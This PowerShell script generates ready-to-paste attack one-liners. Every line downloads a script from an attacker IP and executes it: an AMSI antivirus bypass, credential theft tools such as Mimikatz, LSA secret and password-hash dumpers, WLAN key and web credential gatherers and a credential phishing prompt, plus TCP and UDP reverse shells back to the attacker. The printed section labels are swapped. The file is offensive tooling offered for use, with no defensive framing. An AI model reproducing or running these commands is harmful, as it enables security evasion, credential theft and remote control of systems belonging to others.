$TargetIP = "10.10.10.10"
$TargetPort = ""
$AttackerIP = "10.10.10.16"
$AttackerPort = "443"

$ExecutionArrayBypass = @(
"iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Bypass/Invoke-AmsiBypass.ps1`"); Invoke-AmsiBypass"| Out-String
)

$ExecutionArrayGather = @(
"iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Copy-VSS.ps1`"); Copy-VSS -Destination <Destination>"| Out-String
"iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Get-Information.ps1`"); Get-Information"| Out-String
"iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Get-LSASecret.ps1`"); Get-LSASecret"| Out-String
"iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Get-PassHashes.ps1`"); Get-PassHashes"| Out-String
"iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Get-PassHints.ps1`"); Get-PassHints"| Out-String
"iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Get-WLAN-Keys.ps1`"); Get-WLAN-Keys"| Out-String
"iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Get-WebCredentials.ps1`"); Get-WebCredentials"| Out-String
"iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Invoke-CredentialsPhish.ps1`"); Invoke-CredentialsPhish"| Out-String
"iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Invoke-Mimikatz.ps1`"); Invoke-Mimikatz"| Out-String
"iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Invoke-Mimikittenz.ps1`"); Invoke-Mimikittenz"| Out-String
"iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Gather/Invoke-SessionGopher.ps1`"); Invoke-SessionGopher"| Out-String
)

$ExecutionArrayShells = @(
"iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Shells/Invoke-PowerShellTcp.ps1`"); Invoke-PowerShellTcp -Reverse -IPAddress $AttackerIP -Port $AttackerPort"| Out-String
"iex (New-Object Net.Webclient).DownloadString(`"http://$AttackerIP/Shells/Invoke-PowerShellUdp.ps1`"); Invoke-PowerShellUdp -Reverse -IPAddress $AttackerIP -Port $AttackerPort"| Out-String
)

Start-Sleep -Milliseconds '250'
Write-Host "Shells" -ForegroundColor 'Yellow'
Write-Host $ExecutionArrayBypass
Start-Sleep -Milliseconds '250'
Write-Host "Gather Scripts" -ForegroundColor 'Yellow'
Write-Host $ExecutionArrayGather
Start-Sleep -Milliseconds '250'
Write-Host "Bypasses" -ForegroundColor 'Yellow'
Write-Host $ExecutionArrayShells
